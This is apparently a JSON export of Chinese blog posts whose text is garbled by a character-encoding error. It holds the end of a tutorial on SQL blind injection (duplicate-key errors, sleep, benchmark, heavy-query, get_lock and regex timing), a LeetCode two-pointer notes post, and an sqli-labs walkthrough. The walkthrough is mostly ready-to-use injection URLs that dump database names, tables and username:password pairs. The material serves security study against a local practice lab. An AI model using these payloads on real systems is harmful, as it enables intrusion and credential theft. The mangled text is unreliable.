å‡ºæ¥çš„\nrand([seed]),é€šè¿‡ç»™å®šä¸åŒçš„seedæ¥è¿”å›(0,1)çš„å€¼ï¼Œè€Œfloor()å‡½æ•°åˆ™ä¼šå°†floatçš„å€¼å‘ä¸‹å–æ•´ï¼Œé‚£ä¹ˆrand(14)*2âˆˆ(0,2)ï¼Œå‘ä¸‹å–æ•´å°±å˜æˆäº†{0,1}\n    (2) ä¸»é”®æ˜¯å“ªé‡Œæ¥çš„ï¼Ÿ\næˆ‘ä»¬è¿™é‡Œä½¿ç”¨äº†group byè¯­å¥ï¼Œç›®çš„æ˜¯å¯¹æŸ¥è¯¢çš„ç»“æœæ ¹æ®ç»™å‡ºçš„å­—æ®µè¿›è¡Œåˆ†ç±»ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨èšåˆå‡½æ•°count(*)ï¼Œå¯ä»¥ç”¨æ¥ç»Ÿè®¡æ¯ä¸ªä¸»é”®å‡ºç°çš„æ¬¡æ•°\nåœ¨å®é™…å®ç°çš„è¿‡ç¨‹ä¸­ï¼Œæ•°æ®åº“ä¼šé¦–å…ˆåˆ›å»ºä¸€ä¸ªç©ºçš„ä¸´æ—¶è¡¨ï¼ŒåŒ…å«ä¸¤ä¸ªå­—æ®µ key = concat(database(),floor(rand(14)*2)) count(*) = ä¸»é”®å‡ºç°çš„æ¬¡æ•°\n   key count(*)                          (3) ä¸ºä»€ä¹ˆä¼šå‘ç”Ÿä¸»é”®é‡å¤ï¼Ÿ\næˆ‘ä»¬æ¥ç€çœ‹ï¼Œæ¥ä¸‹æ¥æ•°æ®åº“ä¼šæ ¹æ®ä¸»é”®é€æ¡æŸ¥è¯¢usersè¡¨ä¸­çš„å†…å®¹ã€‚\n è¿™é‡Œä¸ºäº†å¾—åˆ°ä¸»é”®çš„å…·ä½“å†…å®¹ï¼Œè¿›è¡Œäº†ç¬¬ä¸€æ¬¡è®¡ç®—ï¼Œå¾—åˆ°security1(ä¹‹å‰ä¸æ˜¯è¯´äº†éšæœºï¼Œè¿™é‡Œæˆ‘ä¸ºä»€ä¹ˆè¯´å°±æ˜¯security1å‘¢ï¼Œå› ä¸ºå®é™…æµ‹è¯•ç»“æœå°±æ˜¯ï¼Œç¬¬ä¸€ä¸ªç”Ÿæˆçš„æ•°å­—ä¸€å®šå°±æ˜¯1ï¼Œæˆ‘è®¤ä¸ºå¯èƒ½å’Œä¼ªéšæœºæœºåˆ¶æœ‰å…³ç³») æˆ‘ä»¬å½“ç„¶ä¹‹åusersè¡¨é‡Œä¸ä¼šæœ‰security1è¿™æ ·çš„å­—æ®µï¼ŒåŒæ ·æ•°æ®åº“ä¹Ÿæ‰¾ä¸åˆ°ï¼ŒåŒæ—¶ä¹Ÿæ²¡æœ‰å‘ç°é‡å¤çš„ä¸»é”®ï¼Œå› æ­¤ä¼šæŠŠä¸»é”®çš„å€¼ç›´æ¥æ’å…¥ä¸´æ—¶è¡¨ä¸­ï¼Œå¹¶å°†count(*)å¢åŠ ä¸º1\næ­¤æ—¶ä¸ºäº†å¾—åˆ°éœ€è¦æ’å…¥çš„ä¸»é”®çš„å€¼ï¼Œä¼šå†è¿›è¡Œä¸€æ¬¡è®¡ç®—ï¼Œå¾—åˆ°çš„ç»“æœä¸ºsecurity0ï¼ˆå¿…ç„¶å‘ç”Ÿï¼Œç†ç”±åŒä¸Šï¼‰\n   key count(*)     security0 1                ç»§ç»­æ£€ç´¢ç¬¬äºŒæ¡æ•°æ®ï¼Œè®¡ç®—ä¸»é”®çš„å€¼ï¼Œä¸ºsecurity1ï¼ˆå¿…ç„¶å‘ç”Ÿï¼Œç†ç”±åŒä¸Šï¼‰ï¼ŒåŒæ ·åœ¨usersè¡¨ä¸­ä¹Ÿæ²¡æœ‰æ‰¾åˆ°ä¸»é”®çš„å­—æ®µï¼ŒåŒæ—¶ä¹Ÿæ²¡æœ‰å‘ç°ä¸´æ—¶è¡¨ä¸­æœ‰é‡å¤çš„ä¸»é”®ã€‚\næ¥ç€æ’å…¥ä¸»é”®çš„å€¼ï¼Œå†æ¬¡è®¡ç®—ï¼Œå¾—åˆ°security0ï¼ˆå¿…ç„¶å‘ç”Ÿï¼Œç†ç”±åŒä¸Šï¼‰,ä½†æ˜¯è¿™ä¸ªæ—¶å€™åœ¨æ’å…¥çš„æ—¶å€™ï¼Œå°±ä¼šå‘ç”Ÿä¸»é”®å†²çªè€Œäº§ç”ŸæŠ¥é”™ï¼Œå› ä¸ºåŸæœ¬çš„ä¸´æ—¶è¡¨ä¸­å·²ç»æœ‰ä¸€ä¸ªsecurity0äº†ï¼ŒåŒæ—¶ä¼šæŠŠæ•°æ®åº“çš„åå­—+0æ‹¼æ¥åœ¨æŠ¥é”™ä¿¡æ¯ä¸Š\né‚£ä¹ˆåŒæ ·çš„ï¼Œå¦‚æœæˆ‘ä»¬é€‰æ‹©æŸ¥è¯¢å…¶ä»–çš„ä¿¡æ¯æ¥å–å¾—è¿™é‡Œçš„database()ï¼Œé‚£ä¹ˆåœ¨æŠ¥é”™çš„æ—¶å€™ï¼Œå°±èƒ½çœ‹åˆ°æ‰€æŸ¥è¯¢çš„ä¿¡æ¯\n    ï¼ˆ4ï¼‰ä¸ºä»€ä¹ˆå°†randçš„seedè®¾ä¸º14ï¼Ÿ\nå¤§å®¶å¯èƒ½å¹³æ—¶çœ‹åˆ°çš„éƒ½æ˜¯è®¾ä¸º0çš„ï¼Œé‚£ä¹ˆå…ˆç»™å¤§å®¶çœ‹ä¸€ä¸‹ä¸¤ç§seedå¸¦æ¥ä¸åŒçš„æ•ˆæœ\n   floor(rand(0)*2) usage query number     0 ä¸»é”®è®¡ç®— 0   1 ä¸»é”®æ’å…¥ 0   1 ä¸»é”®è®¡ç®— 1   0 ä¸»é”®æ’å…¥ 1   1 ä¸»é”®è®¡ç®— 2   1 ä¸»é”®æ’å…¥ï¼Œä¸»é”®é‡å¤ï¼ŒæŠ¥é”™ 2    è¿™é‡Œéœ€è¦è‡³å°‘ä¸‰æ¡è®°å½•æ‰èƒ½é€ æˆä¸»é”®é‡å¤\né‚£æˆ‘ä»¬å†æ¥çœ‹seedä¸º14çš„æ—¶å€™ï¼Œä¼ªéšæœºç»™å‡ºçš„é¡ºåºä¸º\n   floor(rand(0)*2) usage query number     1 ä¸»é”®è®¡ç®— 0   0 ä¸»é”®æ’å…¥ 0   1 ä¸»é”®è®¡ç®— 1   0 ä¸»é”®æ’å…¥ï¼Œä¸»é”®é‡å¤ï¼ŒæŠ¥é”™ 1    å¾ˆæ˜æ˜¾ï¼Œåªè¦æœ‰ä¸¤æ¡è®°å½•ï¼Œå³å¯é€ æˆæŠ¥é”™\nå¤§å®¶å¯ä»¥æ ¹æ®æˆ‘çš„sqlè¯­å¥è¿›è¡Œå°è¯•ï¼Œå¾—åˆ°çš„ç»“æœé¡ºåºåº”è¯¥æ˜¯ä¸€è‡´ï¼Œè¿™ä¹Ÿå°±å›ç­”äº†ä¸ºä»€ä¹ˆæˆ‘ä¹‹å‰æåˆ°çš„æ˜æ˜æ˜¯éšæœºåˆ°çš„ç»“æœï¼Œä¸ºä»€ä¹ˆè¯´æ˜¯å¿…ç„¶çš„åˆ°çš„ã€‚\n  3. æ—¶é—´ç›²æ³¨ æ—¶é—´ç›²æ³¨æ˜¯ä¸€ç§è¾¹ä¿¡é“æ”»å‡»(Side-channel attack SCA)ï¼ŒåŸæœ¬æ˜¯å¯†ç å­¦çš„ä¸€ä¸ªæ¦‚å¿µï¼Œè¿™ç§æ”»å‡»ç”¨äºåŠ å¯†ç®—æ³•çš„ç ´è§£ï¼Œå®ƒåŸºäºå¯†ç ç³»ç»Ÿçš„ç‰©ç†å®ç°è€Œä¸æ˜¯åŠ å¯†ç®—æ³•å…¶æœ¬èº«ï¼Œæ¯”å¦‚åŠ å¯†æ‰€éœ€è¦çš„æ—¶é—´ï¼Œæ‰€æ¶ˆè€—çš„ç”µå­è®¾å¤‡çš„ä¸€åˆ‡èµ„æºï¼Œç”šè‡³ç”µç£æ³„éœ²æˆ–è€…å£°éŸ³è¿™äº›ä¿¡æ¯æ¥åè¿‡æ¥åˆ†æç®—æ³•æœ¬èº«ã€‚ä¸ªäººè®¤ä¸ºSCAçš„ä¸€ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯è¦åˆ»æ„æ‰©å¤§ä¸€ä¸ªæ­£å¸¸çš„æ“ä½œçš„å½±å“ï¼Œä»¥æ­¤åˆ¶é€ æ˜æ˜¾çš„ç‰¹å¾ã€‚\né‚£ä¹ˆåœ¨æ—¶é—´ç›²æ³¨ä¸­ï¼Œæˆ‘ä»¬æ— æ³•åƒä¸åŒæ³¨å…¥é‚£æ ·ï¼Œå¾—åˆ°æŸ¥è¯¢çš„æ•°æ®ï¼Œä¹Ÿæ— æ³•é€šè¿‡å¸ƒå°”ç›²æ³¨æˆ–è€…æŠ¥é”™ç›²æ³¨åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºçš„è·å¾—ä»»ä½•ä¿¡æ¯ï¼Œè€Œæ˜¯é€šè¿‡é€šè¿‡åˆ¤æ–­è¯­å¥ï¼ŒåŒæ—¶å¢åŠ æˆåŠŸæ³¨å…¥æ‰€ä½¿ç”¨çš„æ—¶é—´ï¼Œé€šè¿‡ä¸åŒæ‹¼æ¥è¯­å¥æ‰€éœ€è¦çš„æ—¶é—´æ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚\n- sleep() åˆ©ç”¨ifè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œåˆ™å»¶è¿Ÿå“åº”5s\n?id=1\u0026#39; or if(ascii(substr(database(),1,1))\u0026gt;115,sleep(5), 0)-- - //if åˆ¤æ–­è¯­å¥ï¼Œæ¡ä»¶ä¸ºçœŸï¼Œ æ‰§è¡Œ sleep select sleep(find_in_set(mmid(@@version, 1, 1), \u0026#39;0,1,2,3,4,5,6,7,8,9,.\u0026#39;)); æ³¨æ„è¿™é‡Œå»ºè®®ä½¿ç”¨ or æ¯”è¾ƒä¿é™©\nå¦‚æœåœ¨æµ‹è¯•çš„æ—¶å€™ä½¿ç”¨ï¼Œ?id=-1\u0026rsquo; and if\u0026hellip;,ç”±äºid=-1æœ¬èº«ä¸ºFalseï¼Œåé¢çš„è¯­å¥éƒ½ä¸ä¼šæ‰§è¡Œï¼ˆä¸ºä»€ä¹ˆä¸ç”¨1ï¼Ÿä¸ºäº†ç»Ÿä¸€ä¹ æƒ¯å§ï¼‰\n- Benchmark() åˆ©ç”¨benchmarkå‡½æ•°ï¼Œå¯¹ä¸€ä¸ªæ“ä½œè¿›è¡Œå¤šæ¬¡çš„æ“ä½œæ¥å®ç°å»¶æ—¶\n?id=1\u0026#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),benchmark(5000000000000000, sha(1),0)-- -    Database Expression     Mysql BENCHMARK(100000,MD5(1)) or sleep(5)   Postgresql PG_SLEEP(5) OR GENERATE_SERIES(1,10000)   Ms sql server WAITFOR DELAY â€˜0:0:5â€™    - ç¬›å¡å°”ç§¯ï¼ˆheavy queryï¼‰ é€šè¿‡æŸ¥è¯¢å¤šä¸ªè¡¨åˆé›†æ¥é€ æˆå¤§é‡çš„æŸ¥è¯¢ï¼Œå¯¼è‡´æŸ¥è¯¢æ—¶é—´å˜é•¿é€ æˆå»¶è¿Ÿ\nSELECTcount(*)FROMinformation_schema.columnsA,information_schema.columnsB,information_schema.columnsC;http://localhost/sqli/Less-5/?id=1\u0026#39;and ascii(substr((select username from users limit 0, 1),1,1)) \u0026lt; 50 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -  - GET_LOCK() https://blog.csdn.net/weixin_40006763/article/details/111687849 mysql_pconnect(server,user,pwd,clientflag)\nmysqlp_connect() å‡½æ•° æ‰“å¼€ä¸€ä¸ªåˆ° MySQL æœåŠ¡å™¨çš„æŒä¹…è¿æ¥ mysqlpconnect() å’Œ mysqlconnect() éå¸¸ç›¸ä¼¼ï¼Œä½†æœ‰ä¸¤ä¸ªä¸»è¦åŒºåˆ«ï¼š 1ã€å½“è¿æ¥çš„æ—¶å€™æœ¬å‡½æ•°å°†å…ˆå°è¯•å¯»æ‰¾ä¸€ä¸ªåœ¨åŒä¸€ä¸ªä¸»æœºä¸Šç”¨åŒæ ·çš„ç”¨æˆ·åå’Œå¯†ç å·²ç»æ‰“å¼€çš„(æŒä¹…)è¿æ¥ï¼Œ å¦‚æœæ‰¾åˆ°ï¼Œåˆ™è¿”å›æ­¤è¿æ¥æ ‡è¯†è€Œä¸æ‰“å¼€æ–°è¿æ¥ã€‚ 2ã€å½“è„šæœ¬æ‰§è¡Œå®Œæ¯•ååˆ° SQL æœåŠ¡å™¨çš„è¿æ¥ä¸ä¼šè¢«å…³é—­ï¼Œæ­¤è¿æ¥å°†ä¿æŒæ‰“å¼€ä»¥å¤‡ä»¥åä½¿ç”¨ (mysqlclose() ä¸ä¼šå…³é—­ç”± mysql_pconnect() å»ºç«‹çš„è¿æ¥). get_lock(str,timeout)\nTries to obtain a lock with a name given by the string str, using a timeout of timeout seconds. A negative timeout value means infinite timeout. The lock is exclusive. While held by one session, other sessions cannot obtain a lock of the same name.get_lockä¼šæŒ‰ç…§keyæ¥åŠ é”ï¼Œåˆ«çš„å®¢æˆ·ç«¯å†ä»¥åŒæ ·çš„keyåŠ é”æ—¶å°±åŠ ä¸äº†äº†ï¼Œå¤„äºç­‰å¾…çŠ¶æ€ã€‚ åœ¨ä¸€ä¸ªsessionä¸­é”å®šå˜é‡ï¼ŒåŒæ—¶é€šè¿‡å¦å¤–ä¸€ä¸ªsessionæ‰§è¡Œï¼Œå°†ä¼šäº§ç”Ÿå»¶æ—¶ ä¹Ÿå°±æ˜¯è¯´æ­¤æ–¹æ³•åªæœ‰åœ¨æ•°æ®åº“çš„è¿æ¥æ˜¯æŒä¹…è¿æ¥çš„æ—¶å€™æ‰èƒ½ç”Ÿæ•ˆ ä¸¾ä¸ªæ —å­ï¼š æ‰“å¼€ä¸¤ä¸ªmysqlçš„shell ç°åœ¨ä¸€ä¸ªshellä¸­æ‰§è¡Œå‘½ä»¤ select getlock(\u0026lsquo;sdpc\u0026rsquo;,5) å…ˆä¸Šé” ç„¶åå¦å¤–ä¸€ä¸ªshellä¸­æ‰§è¡Œé‡å¤çš„å‘½ä»¤ ç¬¬äºŒä¸ªshellä¸­ä¾¿å‡ºç°å»¶è¿Ÿ å»¶è¿Ÿçš„æ—¶é—´ç”±ç¬¬äºŒä¸ªshellçš„getlockä¸­çš„å‚æ•°å†³å®š.Soï¼Œåœ¨æˆ‘ä»¬å†™è„šæœ¬çš„æ—¶å€™ï¼Œå…ˆåŠ é”ï¼Œå†è¿›è¡Œç›²æ³¨å³å¯(ä½¿ç”¨requestsåº“æ—¶æ³¨æ„åŠ é”å’Œç›²æ³¨ä¸è¦åœ¨åŒä¸€ä¸ªsessionä¸‹)\n- æ­£åˆ™bug https://xz.aliyun.com/t/2288 è¿™æ˜¯ä¸€ä¸ªè€ç”Ÿå¸¸è°ˆçš„é—®é¢˜äº†ï¼Œä½†ä¹‹å‰å¯èƒ½å¾ˆå°‘ä¼šæŠŠå®ƒæ”¾åˆ°æ³¨å…¥é‡Œè®¨è®ºã€‚\næ­£åˆ™åŒ¹é…åœ¨åŒ¹é…è¾ƒé•¿å­—ç¬¦ä¸²ä½†è‡ªç”±åº¦æ¯”è¾ƒé«˜çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¼šé€ æˆæ¯”è¾ƒå¤§çš„è®¡ç®—é‡ï¼Œæˆ‘ä»¬é€šè¿‡rpadæˆ–repeatæ„é€ é•¿å­—ç¬¦ä¸²ï¼ŒåŠ ä»¥è®¡ç®—é‡å¤§çš„patternï¼Œé€šè¿‡æ§åˆ¶å­—ç¬¦ä¸²é•¿åº¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶å»¶æ—¶ã€‚\nmysql\u0026gt; select rpad(\u0026#39;a\u0026#39;,4999999,\u0026#39;a\u0026#39;) RLIKE concat(repeat(\u0026#39;(a.*)+\u0026#39;,30),\u0026#39;b\u0026#39;); +-------------------------------------------------------------+ | rpad(\u0026#39;a\u0026#39;,4999999,\u0026#39;a\u0026#39;) RLIKE concat(repeat(\u0026#39;(a.*)+\u0026#39;,30),\u0026#39;b\u0026#39;) | +-------------------------------------------------------------+ | 0 | +-------------------------------------------------------------+ 1 row in set (5.22 sec) ","date":"2022-03-27T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sqli_blind_injection/","title":"SQLæ³¨å…¥ï¼šç›²æ³¨"},{"content":"LeetBook Basic Algorithm Notes https://leetcode-cn.com/leetbook/read/top-interview-questions-easy/\nåˆ é™¤æ’åºæ•°ç»„ä¸­çš„é‡å¤é¡¹ è§£é¢˜æ–¹æ³•ï¼šåˆ©ç”¨åŒæŒ‡é’ˆ\nè§£é¢˜æ€è·¯ï¼š å®šä¹‰ä¸¤ä¸ªæŒ‡é’ˆ fast, low,èµ·å§‹åˆ†åˆ«æŒ‡å‘nums[1]ï¼Œå¾ªç¯éå†ç›´è‡³æœ€åä¸€ä¸ªå…ƒç´ ï¼Œæ¯æ¬¡åˆ¤æ–­nums[fast] == [fast-1],å¦‚æœä¸æƒ³ç­‰ï¼Œè¯´æ˜å½“å‰nums[fast]çš„å€¼è¿˜æ²¡æœ‰é‡å¤ï¼Œè¿™æ—¶nums[low]å†™å…¥nums[fast]çš„å€¼ï¼ˆè¿™é‡Œä¸ç”¨æ‹…å¿ƒä¼šè¦†ç›–æ²¡æœ‰é‡å¤çš„å…ƒç´ ï¼Œå› ä¸ºlowæ°¸è¿œ\u0026lt;=fastï¼Œå½“low\u0026lt;fastæ—¶è¯´æ˜æœ‰é‡å¤çš„å…ƒç´ éœ€è¦è¦†ç›–ï¼‰ï¼›å¦‚æœç›¸ç­‰ï¼Œè¯´æ˜é‡å¤äº†ï¼Œfastè‡ªå¢ï¼Œlowä¿æŒä¸å˜ï¼ˆè¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œfastè‡ªå¢åä¼šç•™ä¸‹ä¸€ä¸ªé‡å¤çš„å…ƒç´ ï¼Œå¯ä»¥ç”¨äºè¦†ç›–ï¼‰ã€‚\nå¤æ‚åº¦ï¼š æ—¶é—´å¤æ‚åº¦O(n)ï¼šéå†æ•°ç»„ ç©ºé—´å¤æ‚åº¦O(1): åŸæ•°ç»„è¿›è¡Œå…ƒç´ è¦†ç›–\næµ‹è¯•ç”¨ä¾‹ï¼š\n æ•°ç»„é•¿åº¦ä¸º0çš„æƒ…å†µ æ•°ç»„å«æœ‰é‡å¤å…ƒç´ çš„æƒ…å†µ æ•°ç»„ä¸å«æœ‰é‡å¤å…ƒç´ çš„æƒ…å†µ   class Solution: def removeDuplicates(self, nums: List[int]) -\u0026gt; int: if not nums: return 0 length = len(nums) fast = slow = 1 while fast \u0026lt; length: if nums[fast] != nums[fast-1]: nums[slow] = nums[fast] slow += 1 fast += 1 return slow è¿™é‡Œæˆ‘ä»¬æ¥æ‹“å±•ä¸€ä¸‹ï¼Œå¦‚æœå…è®¸æ¯ä¸ªå…ƒç´ æœ€å¤šå‡ºç°ä¸¤æ¬¡å‘¢ï¼Œä¼šæœ‰ä»€ä¹ˆå˜åŒ–å‘¢ï¼Ÿ\næ ¸å¿ƒæ€æƒ³æ˜¯è¦ä¿è¯ å†™å…¥çš„å€¼ ï¼šnums[fast]ï¼Œåœ¨ å†™å…¥çš„ä½ç½® ï¼šnums[slow]ï¼Œè¦å’Œnums[slow-2]çš„å€¼ä¸ä¸€æ ·\nä¸ºä»€ä¹ˆä¹‹å‰è¦æ±‚ä¸€ä¸ªéƒ½ä¸é‡å¤çš„æ—¶å€™å¯ä»¥ç”¨nums[fast]ä¸nums[fast-1]è¿›è¡Œæ¯”è¾ƒï¼Œç°åœ¨å´ä¸è¡Œäº†å‘¢ï¼Ÿ å› ä¸ºåœ¨ä¹‹å‰ï¼Œnums[fast-1]çš„ä½ç½®ä¸å¯èƒ½æ˜¯æ›´æ”¹è¿‡çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯ä¸æ˜¯nums[slow]çš„æ›¾ç»åˆ°è¿‡çš„ä½ç½®ï¼Œå› æ­¤ä¸ä¼šå½±å“åˆ¤æ–­ï¼› ä½†æ˜¯åœ¨å…è®¸æœ‰ä¸€ä¸ªé‡å¤çš„å…ƒç´ çš„æƒ…å†µä¸‹ï¼Œå½“å‰nums[fast]éœ€è¦ä¸å‰ä¸¤ä½è¿›è¡Œå¯¹æ¯”ï¼Œé‚£ä¹ˆå¯èƒ½å°±ä¼šå­˜åœ¨nums[fast-2]å·²ç»åšè¿‡äº†ä¿®æ”¹ï¼ˆå› ä¸ºslowè¿˜æ˜¯è‡ªå¢1çš„ï¼‰ï¼Œé€ æˆè¯¯åˆ¤\nclass Solution: def removeDuplicates(self, nums: List[int]) -\u0026gt; int: if not nums: return 0 fast = slow = 2 length = len(nums) while fast \u0026lt; length: if nums[fast] != nums[slow - 2]: nums[slow] = nums[fast] slow += 1 fast += 1 return slow é‚£ä¹ˆæˆ‘ä»¬å†æ‰©å±•å…è®¸åˆ°nä¸ªå…ƒç´ é‡å¤ æ ¸å¿ƒæ€æƒ³æ˜¯è¦ä¿è¯ å†™å…¥çš„å€¼ ï¼šnums[fast]ï¼Œåœ¨ å†™å…¥çš„ä½ç½® ï¼šnums[slow]ï¼Œè¦å’Œnums[slow-k]çš„å€¼ä¸ä¸€æ ·\nclass Solution: def removeDuplicates(self, nums: List[int]) -\u0026gt; int: if not nums: return 0 def expand(duplicates: int): fast = slow = duplicates length = len(nums) while fast \u0026lt; length: if nums[fast] != nums[slow - duplicates]: nums[slow] = nums[fast] slow += 1 fast += 1 return slow return expand(2) ","date":"2022-03-23T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/leetbook_basic_algorithm/","title":"LeetBook Basic Algorithm"},{"content":"\u0026lt;!\u0026ndash;more\u0026ndash;\u0026gt;\nSqli-labs: Basic Challenges Basic lesson 1 ç¡®è®¤å­˜åœ¨æ³¨å…¥ http://localhost/sqli/Less-1/?id=1' http://localhost/sqli/Less-1/?id=1\u0026rsquo;\u0026ndash;+\nç¡®è®¤queryè¯­å¥è¯·æ±‚åˆ—æ•° http://localhost/sqli/Less-1/?id=1\u0026rsquo; order by 3\u0026ndash;+\nçˆ†æ•°æ®åº“ æ•°æ®åº“ http://localhost/sqli/Less-1/?id=-1\u0026rsquo; union select 1,group_concat(SCHEMA_NAME),3 from information_schema.schemata\u0026ndash;+ è¡¨ http://localhost/sqli/Less-1/?id=-1\u0026rsquo; union select 1,group_concat(TABLE_NAME),3 from information_schema.tables where table_schema=\u0026ldquo;security\u0026rdquo;\u0026ndash;+\nåˆ— http://localhost/sqli/Less-1/?id=-1\u0026rsquo; union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where table_name=\u0026ldquo;users\u0026rdquo;\u0026ndash;+\nå¾—åˆ°æ•°æ® http://localhost/sqli/Less-1/?id=-1\u0026rsquo; union select 1,username,password from users where id=2\u0026ndash;+\nlesson 2 \u0026lsquo;æ— æ³•é—­åˆï¼Œè¯´æ˜è¦æ±‚æ˜¯ä¸€ä¸ªINTå‹å˜é‡ å› æ­¤å°†æ‰€æœ‰å•å¼•å·å»æ‰ä¹‹åï¼Œä¸€åˆ‡ç…§æ—§\nlesson 3 ?id=\u0026lsquo;å¾—åˆ°æŠ¥é”™ï¼š MySQL server version for the right syntax to use near â€â€) LIMIT 0,1â€² at line 1 è¯´æ˜å­˜åœ¨ä¸€ä¸ª)éœ€è¦é—­åˆ å°†æ³¨å…¥ç‚¹éƒ½æ”¹ä¸º ?id=-1\u0026rsquo;)å³å¯\nlesson 4 ?id=-1\u0026quot;)\nlesson 5 ç›²æ³¨\n  æŠ¥é”™æ³¨å…¥\n  updatexml()\nçˆ†åº“å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and updatexml(1,concat(0x7e,database(),0x7e,version(),0x7e),3)-- - http://localhost/sqli/Less-5/ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e,version(),0x7e),3)-- - çˆ†è¡¨å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#34;security\u0026#34;),0x7e,version(),0x7e),3)-- - çˆ†åˆ—å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#34;user\u0026#34;),0x7e,version(),0x7e),3)-- - çˆ†æ•°æ®\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select concat_ws(\u0026#39;:\u0026#39;, username, password) from users limit 0, 1),0x7e,version(),0x7e),3)-- -     extractvalue()\nçˆ†åº“å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e))-- - http://localhost/sqli/Less-5/ ?id=1\u0026#39; and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e,version(),0x7e))-- - çˆ†è¡¨å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#34;security\u0026#34;),0x7e,version(),0x7e))-- - çˆ†åˆ—å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#34;user\u0026#34;),0x7e,version(),0x7e))-- - çˆ†æ•°æ®\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and extractvalue(1,concat(0x7e,(select concat_ws(\u0026#39;:\u0026#39;, username, password) from users limit 0, 1),0x7e,version(),0x7e))-- -     ä¸»é”®é‡å¤\n?id=1\u0026rsquo; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a\u0026ndash;+ çˆ†åº“å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - #Subquery returns more than 1 row http://localhost/sqli/Less-5/ ?id=1\u0026#39;and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - çˆ†è¡¨å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#34;security\u0026#34;),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - ?id=1\u0026#39;and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - çˆ†åˆ—å\n?id=1\u0026#39;and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=\u0026#34;user\u0026#34; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - çˆ†æ•°æ®\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and (select 1 from (select count(*),concat((select concat_ws(\u0026#39;:\u0026#39;, username, password) from users limit 0, 1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -       å¸ƒå°”ç›²æ³¨\n  left()\nçˆ†åº“å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and left(database(), 1)\u0026lt;\u0026#39;s\u0026#39;-- - http://localhost/sqli/Less-5/ ?id=1\u0026#39; and left((select schema_name from information_schema.schemata limit 0,1), 1)\u0026lt;\u0026#39;s\u0026#39;-- - çˆ†è¡¨å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and left((select table_name from information_schema.tables where table_schema = \u0026#34;security\u0026#34; limit 0,1), 1)\u0026lt;\u0026#39;a\u0026#39;-- - çˆ†åˆ—å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and left((select column_name from information_schema.columns where table_name = \u0026#34;users\u0026#34; limit 0,1), 1)\u0026lt;\u0026#39;a\u0026#39;-- - çˆ†æ•°æ®\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and left((select username from users limit 0,1), 1)\u0026lt;\u0026#39;z\u0026#39;-- -     substr() \u0026amp; ascii()\nçˆ†åº“å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select schema_name from information_schema.schemata limit 0, 1),1,1)) \u0026lt; 80-- - çˆ†è¡¨å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#34;security\u0026#34; limit 0, 1),1,1)) \u0026lt; 80-- - çˆ†åˆ—å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select column_name from information_schema.columns where table_name=\u0026#34;users\u0026#34; limit 0, 1),1,1)) \u0026gt; 80-- - çˆ†æ•°æ®\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39;and ascii(substr((select username from users limit 0, 1),1,1)) \u0026lt; 50-- -     regexp\nçˆ†åº“å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and 1=(select 1 from information_schema.schemata where schema_name regexp \u0026#39;^security\u0026#39; limit 0,1)-- - çˆ†è¡¨å\nhttp://localhost/sqli/Less-5/ ?id=1\u0026#39; and 1=(select 1 from information_schema.tables where table_schema = \u0026#34;security\u0026#34; and table_name regexp \u0026#39;^users\u0026#39; limit 1,1)-- - 